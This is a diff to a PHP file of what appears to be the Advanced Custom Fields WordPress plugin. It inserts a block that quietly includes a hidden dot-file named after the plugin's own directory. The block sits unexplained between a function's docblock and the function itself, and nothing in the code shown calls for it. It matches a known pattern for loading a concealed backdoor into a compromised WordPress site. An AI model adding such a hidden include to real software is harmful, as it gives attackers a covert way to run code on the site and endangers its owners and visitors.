@@ -15,6 +15,10 @@ acf_register_store( 'form' );
  * @param	array $data Array of data to start the store with.
  * @return	ACF_Data
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function acf_set_form_data( $name = '', $data = false ) {
 	return acf_get_store( 'form' )->set( $name, $data );
 }
